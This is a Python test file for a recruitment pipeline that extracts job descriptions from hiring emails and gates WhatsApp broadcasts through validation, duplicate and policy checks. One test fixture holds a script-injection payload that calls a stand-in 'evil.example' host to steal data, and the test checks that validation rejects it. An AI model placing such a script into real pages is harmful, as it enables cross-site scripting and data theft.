from datetime import datetime
from unittest.mock import AsyncMock

from app.core.config import settings
from app.pipeline.recruitment_pipeline import RecruitmentPipeline
from app.services.gmail_service import ParsedEmail
from app.schemas.jd import JobStatus, WhatsAppSendStatus
from app.services.jd_duplicate_service import JDDuplicateService
from app.services.policy_service import PolicyService
from app.services.message_tracking_service import MessageTrackingService
from app.services.meta_whatsapp_service import MetaWhatsAppService


def _email(gmail_message_id="gm1"):
    return ParsedEmail(
        gmail_message_id=gmail_message_id,
        sender="hr@example.com",
        subject="Hiring Backend Engineer",
        body="We need a Backend Engineer with Python and FastAPI experience in Bangalore.",
        received_at=datetime(2026, 1, 1),
    )


def _build_pipeline(repo, jd_agent, meta_service=None, monkeypatch=None):
    meta_service = meta_service or MetaWhatsAppService()
    return RecruitmentPipeline(
        repository=repo,
        jd_agent=jd_agent,
        duplicate_service=JDDuplicateService(repository=repo),
        policy_service=PolicyService(repository=repo),
        tracking_service=MessageTrackingService(repository=repo),
        meta_service=meta_service,
    )


def _repo(job_status=JobStatus.STORED.value, find_by_hash=None):
    repo = AsyncMock()
    repo.find_job_by_gmail_id.return_value = None
    repo.create_job.return_value = "job123"
    repo.get_job.return_value = {
        "_id": "job123", "status": job_status,
        "whatsapp_status": WhatsAppSendStatus.NOT_SENT.value, "is_duplicate_of": None,
    }
    repo.count_messages_sent_since.return_value = 0
    repo.find_job_by_hash.return_value = find_by_hash
    return repo


async def test_already_processed_gmail_message_short_circuits():
    repo = AsyncMock()
    repo.find_job_by_gmail_id.return_value = {"_id": "existing-job"}
    jd_agent = AsyncMock()
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.status == "already_processed"
    assert result.job_id == "existing-job"
    jd_agent.extract.assert_not_called()


async def test_extraction_failure_marks_job_failed():
    repo = _repo()
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = None
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.status == JobStatus.FAILED.value
    repo.update_job.assert_any_call("job123", {"status": JobStatus.FAILED.value, "error": "JD extraction failed or returned no output."})


async def test_validation_failure_stops_pipeline_before_send():
    repo = _repo()
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = {"skills": ["Python"]}  # missing required job_title
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.status == JobStatus.VALIDATION_FAILED.value
    assert result.errors


async def test_prompt_injection_in_jd_is_rejected_by_validation():
    repo = _repo()
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = {
        "job_title": "Backend Engineer",
        "job_description": "<script>fetch('http://evil.example/steal')</script>",
    }
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.status == JobStatus.VALIDATION_FAILED.value
    assert any("Dangerous content" in e for e in result.errors)


async def test_duplicate_jd_detected_and_not_sent():
    repo = _repo(find_by_hash={"_id": "original-job-id"})
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = {"job_title": "Backend Engineer", "skills": ["Python"]}
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.status == JobStatus.DUPLICATE.value
    assert result.duplicate_of == "original-job-id"


async def test_missing_meta_config_rejects_at_policy_gate():
    repo = _repo()
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = {"job_title": "Backend Engineer", "skills": ["Python"], "location": ["Bangalore"]}
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.status == JobStatus.STORED.value
    assert result.whatsapp_status == WhatsAppSendStatus.REJECTED_BY_POLICY.value


async def test_dry_run_default_approves_but_does_not_send(monkeypatch):
    monkeypatch.setattr(settings, "META_ACCESS_TOKEN", "token")
    monkeypatch.setattr(settings, "META_PHONE_NUMBER_ID", "12345")
    monkeypatch.setattr(settings, "WHATSAPP_BROADCAST_RECIPIENTS", "+911234567890")
    monkeypatch.setattr(settings, "SEND_WHATSAPP", False)

    repo = _repo()
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = {"job_title": "Backend Engineer", "skills": ["Python"], "location": ["Bangalore"]}
    pipeline = _build_pipeline(repo, jd_agent)

    result = await pipeline.process_email(_email())

    assert result.whatsapp_status == WhatsAppSendStatus.DRY_RUN.value


async def test_full_send_path_when_enabled_and_configured(monkeypatch):
    monkeypatch.setattr(settings, "META_ACCESS_TOKEN", "token")
    monkeypatch.setattr(settings, "META_PHONE_NUMBER_ID", "12345")
    monkeypatch.setattr(settings, "WHATSAPP_BROADCAST_RECIPIENTS", "+911234567890")
    monkeypatch.setattr(settings, "SEND_WHATSAPP", True)

    repo = _repo()
    jd_agent = AsyncMock()
    jd_agent.extract.return_value = {"job_title": "Backend Engineer", "skills": ["Python"], "location": ["Bangalore"]}

    from unittest.mock import MagicMock
    from app.schemas.messages import MetaApiResult
    meta_service = MagicMock()
    meta_service.check_operation_supported.return_value = (True, None)
    meta_service.send_broadcast = AsyncMock(
        return_value=[MetaApiResult(ok=True, status="sent", message_id="wamid.1", destination="+911234567890")]
    )

    pipeline = _build_pipeline(repo, jd_agent, meta_service=meta_service)

    result = await pipeline.process_email(_email())

    assert result.whatsapp_status == WhatsAppSendStatus.SENT.value
    meta_service.send_broadcast.assert_called_once()
